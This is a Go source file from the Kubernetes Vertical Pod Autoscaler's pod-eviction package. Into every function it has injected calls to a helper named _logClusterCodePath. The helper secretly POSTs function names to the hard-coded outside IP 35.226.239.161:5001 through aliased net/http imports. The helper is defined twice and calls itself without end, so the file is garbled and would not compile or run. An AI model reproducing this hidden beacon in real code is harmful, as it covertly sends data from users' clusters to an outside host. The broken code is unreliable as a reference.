package eviction

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"time"
	"github.com/golang/glog"
	appsv1 "k8s.io/api/apps/v1"
	apiv1 "k8s.io/api/core/v1"
	policyv1 "k8s.io/api/policy/v1beta1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	metrics_updater "k8s.io/autoscaler/vertical-pod-autoscaler/pkg/utils/metrics/updater"
	appsinformer "k8s.io/client-go/informers/apps/v1"
	coreinformer "k8s.io/client-go/informers/core/v1"
	kube_client "k8s.io/client-go/kubernetes"
	"k8s.io/client-go/tools/cache"
	"k8s.io/client-go/tools/record"
)

const (
	resyncPeriod time.Duration = 1 * time.Minute
)

type PodsEvictionRestriction interface {
	Evict(pod *apiv1.Pod, eventRecorder record.EventRecorder) error
	CanEvict(pod *apiv1.Pod) bool
}
type podsEvictionRestrictionImpl struct {
	client				kube_client.Interface
	podToReplicaCreatorMap		map[string]podReplicaCreator
	creatorToSingleGroupStatsMap	map[podReplicaCreator]singleGroupStats
}
type singleGroupStats struct {
	configured		int
	pending			int
	running			int
	evictionTolerance	int
	evicted			int
}
type PodsEvictionRestrictionFactory interface {
	NewPodsEvictionRestriction(pods []*apiv1.Pod) PodsEvictionRestriction
}
type podsEvictionRestrictionFactoryImpl struct {
	client				kube_client.Interface
	rcInformer			cache.SharedIndexInformer
	ssInformer			cache.SharedIndexInformer
	rsInformer			cache.SharedIndexInformer
	minReplicas			int
	evictionToleranceFraction	float64
}
type controllerKind string

const (
	replicationController	controllerKind	= "ReplicationController"
	statefulSet		controllerKind	= "StatefulSet"
	replicaSet		controllerKind	= "ReplicaSet"
	job			controllerKind	= "Job"
)

type podReplicaCreator struct {
	Namespace	string
	Name		string
	Kind		controllerKind
}

func (e *podsEvictionRestrictionImpl) CanEvict(pod *apiv1.Pod) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	cr, present := e.podToReplicaCreatorMap[getPodID(pod)]
	if present {
		singleGroupStats, present := e.creatorToSingleGroupStatsMap[cr]
		if pod.Status.Phase == apiv1.PodPending {
			return true
		}
		if present {
			shouldBeAlive := singleGroupStats.configured - singleGroupStats.evictionTolerance
			if singleGroupStats.running-singleGroupStats.evicted > shouldBeAlive {
				return true
			}
			if singleGroupStats.running == singleGroupStats.configured && singleGroupStats.evictionTolerance == 0 && singleGroupStats.evicted == 0 {
				return true
			}
		}
	}
	return false
}
func (e *podsEvictionRestrictionImpl) Evict(podToEvict *apiv1.Pod, eventRecorder record.EventRecorder) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	cr, present := e.podToReplicaCreatorMap[getPodID(podToEvict)]
	if !present {
		return fmt.Errorf("pod not suitable for eviction %v : not in replicated pods map", podToEvict.Name)
	}
	if !e.CanEvict(podToEvict) {
		return fmt.Errorf("cannot evict pod %v : eviction budget exceeded", podToEvict.Name)
	}
	eviction := &policyv1.Eviction{ObjectMeta: metav1.ObjectMeta{Namespace: podToEvict.Namespace, Name: podToEvict.Name}}
	err := e.client.CoreV1().Pods(podToEvict.Namespace).Evict(eviction)
	if err != nil {
		glog.Errorf("failed to evict pod %s/%s, error: %v", podToEvict.Namespace, podToEvict.Name, err)
		return err
	}
	eventRecorder.Event(podToEvict, apiv1.EventTypeNormal, "EvictedByVPA", "Pod was evicted by VPA Updater to apply resource recommendation.")
	metrics_updater.AddEvictedPod()
	if podToEvict.Status.Phase != apiv1.PodPending {
		singleGroupStats, present := e.creatorToSingleGroupStatsMap[cr]
		if !present {
			return fmt.Errorf("Internal error - cannot find stats for replication group %v", cr)
		}
		singleGroupStats.evicted = singleGroupStats.evicted + 1
		e.creatorToSingleGroupStatsMap[cr] = singleGroupStats
	}
	return nil
}
func NewPodsEvictionRestrictionFactory(client kube_client.Interface, minReplicas int, evictionToleranceFraction float64) (PodsEvictionRestrictionFactory, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	rcInformer, err := setUpInformer(client, replicationController)
	if err != nil {
		return nil, fmt.Errorf("Failed to create rcInformer: %v", err)
	}
	ssInformer, err := setUpInformer(client, statefulSet)
	if err != nil {
		return nil, fmt.Errorf("Failed to create ssInformer: %v", err)
	}
	rsInformer, err := setUpInformer(client, replicaSet)
	if err != nil {
		return nil, fmt.Errorf("Failed to create rsInformer: %v", err)
	}
	return &podsEvictionRestrictionFactoryImpl{client: client, rcInformer: rcInformer, ssInformer: ssInformer, rsInformer: rsInformer, minReplicas: minReplicas, evictionToleranceFraction: evictionToleranceFraction}, nil
}
func (f *podsEvictionRestrictionFactoryImpl) NewPodsEvictionRestriction(pods []*apiv1.Pod) PodsEvictionRestriction {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	livePods := make(map[podReplicaCreator][]*apiv1.Pod)
	for _, pod := range pods {
		creator, err := getPodReplicaCreator(pod)
		if err != nil {
			glog.Errorf("failed to obtain replication info for pod %s: %v", pod.Name, err)
			continue
		}
		if creator == nil {
			glog.Warningf("pod %s not replicated", pod.Name)
			continue
		}
		livePods[*creator] = append(livePods[*creator], pod)
	}
	podToReplicaCreatorMap := make(map[string]podReplicaCreator)
	creatorToSingleGroupStatsMap := make(map[podReplicaCreator]singleGroupStats)
	for creator, replicas := range livePods {
		actual := len(replicas)
		if actual < f.minReplicas {
			glog.V(2).Infof("too few replicas for %v %v/%v. Found %v live pods", creator.Kind, creator.Namespace, creator.Name, actual)
			continue
		}
		var configured int
		if creator.Kind == job {
			configured = actual
		} else {
			var err error
			configured, err = f.getReplicaCount(creator)
			if err != nil {
				glog.Errorf("failed to obtain replication info for %v %v/%v. %v", creator.Kind, creator.Namespace, creator.Name, err)
				continue
			}
		}
		singleGroup := singleGroupStats{}
		singleGroup.configured = configured
		singleGroup.evictionTolerance = int(float64(configured) * f.evictionToleranceFraction)
		for _, pod := range replicas {
			podToReplicaCreatorMap[getPodID(pod)] = creator
			if pod.Status.Phase == apiv1.PodPending {
				singleGroup.pending = singleGroup.pending + 1
			}
		}
		singleGroup.running = len(replicas) - singleGroup.pending
		creatorToSingleGroupStatsMap[creator] = singleGroup
	}
	return &podsEvictionRestrictionImpl{client: f.client, podToReplicaCreatorMap: podToReplicaCreatorMap, creatorToSingleGroupStatsMap: creatorToSingleGroupStatsMap}
}
func getPodReplicaCreator(pod *apiv1.Pod) (*podReplicaCreator, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	creator := managingControllerRef(pod)
	if creator == nil {
		return nil, nil
	}
	podReplicaCreator := &podReplicaCreator{Namespace: pod.Namespace, Name: creator.Name, Kind: controllerKind(creator.Kind)}
	return podReplicaCreator, nil
}
func getPodID(pod *apiv1.Pod) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	if pod == nil {
		return ""
	}
	return pod.Namespace + "/" + pod.Name
}
func (f *podsEvictionRestrictionFactoryImpl) getReplicaCount(creator podReplicaCreator) (int, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	switch creator.Kind {
	case replicationController:
		rcObj, exists, err := f.rcInformer.GetStore().GetByKey(creator.Namespace + "/" + creator.Name)
		if err != nil {
			return 0, fmt.Errorf("replication controller %s/%s is not available, err: %v", creator.Namespace, creator.Name, err)
		}
		if !exists {
			return 0, fmt.Errorf("replication controller %s/%s does not exist", creator.Namespace, creator.Name)
		}
		rc, ok := rcObj.(*apiv1.ReplicationController)
		if !ok {
			return 0, fmt.Errorf("Failed to parse Replication Controller")
		}
		if rc.Spec.Replicas == nil || *rc.Spec.Replicas == 0 {
			return 0, fmt.Errorf("replication controller %s/%s has no replicas config", creator.Namespace, creator.Name)
		}
		return int(*rc.Spec.Replicas), nil
	case replicaSet:
		rsObj, exists, err := f.rsInformer.GetStore().GetByKey(creator.Namespace + "/" + creator.Name)
		if err != nil {
			return 0, fmt.Errorf("replica set %s/%s is not available, err: %v", creator.Namespace, creator.Name, err)
		}
		if !exists {
			return 0, fmt.Errorf("replica set %s/%s does not exist", creator.Namespace, creator.Name)
		}
		rs, ok := rsObj.(*appsv1.ReplicaSet)
		if !ok {
			return 0, fmt.Errorf("Failed to parse Replicaset")
		}
		if rs.Spec.Replicas == nil || *rs.Spec.Replicas == 0 {
			return 0, fmt.Errorf("replica set %s/%s has no replicas config", creator.Namespace, creator.Name)
		}
		return int(*rs.Spec.Replicas), nil
	case statefulSet:
		ssObj, exists, err := f.ssInformer.GetStore().GetByKey(creator.Namespace + "/" + creator.Name)
		if err != nil {
			return 0, fmt.Errorf("stateful set %s/%s is not available, err: %v", creator.Namespace, creator.Name, err)
		}
		if !exists {
			return 0, fmt.Errorf("stateful set %s/%s does not exist", creator.Namespace, creator.Name)
		}
		ss, ok := ssObj.(*appsv1.StatefulSet)
		if !ok {
			return 0, fmt.Errorf("Failed to parse StatefulSet")
		}
		if ss.Spec.Replicas == nil || *ss.Spec.Replicas == 0 {
			return 0, fmt.Errorf("stateful set %s/%s has no replicas config", creator.Namespace, creator.Name)
		}
		return int(*ss.Spec.Replicas), nil
	}
	return 0, nil
}
func managingControllerRef(pod *apiv1.Pod) *metav1.OwnerReference {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	var managingController metav1.OwnerReference
	for _, ownerReference := range pod.ObjectMeta.GetOwnerReferences() {
		if *ownerReference.Controller {
			managingController = ownerReference
			break
		}
	}
	return &managingController
}
func setUpInformer(kubeClient kube_client.Interface, kind controllerKind) (cache.SharedIndexInformer, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	var informer cache.SharedIndexInformer
	switch kind {
	case replicationController:
		informer = coreinformer.NewReplicationControllerInformer(kubeClient, apiv1.NamespaceAll, resyncPeriod, cache.Indexers{cache.NamespaceIndex: cache.MetaNamespaceIndexFunc})
	case replicaSet:
		informer = appsinformer.NewReplicaSetInformer(kubeClient, apiv1.NamespaceAll, resyncPeriod, cache.Indexers{cache.NamespaceIndex: cache.MetaNamespaceIndexFunc})
	case statefulSet:
		informer = appsinformer.NewStatefulSetInformer(kubeClient, apiv1.NamespaceAll, resyncPeriod, cache.Indexers{cache.NamespaceIndex: cache.MetaNamespaceIndexFunc})
	default:
		return nil, fmt.Errorf("Unknown controller kind: %v", kind)
	}
	stopCh := make(chan struct{})
	go informer.Run(stopCh)
	synced := cache.WaitForCacheSync(stopCh, informer.HasSynced)
	if !synced {
		return nil, fmt.Errorf("Failed to sync %v cache.", kind)
	}
	return informer, nil
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
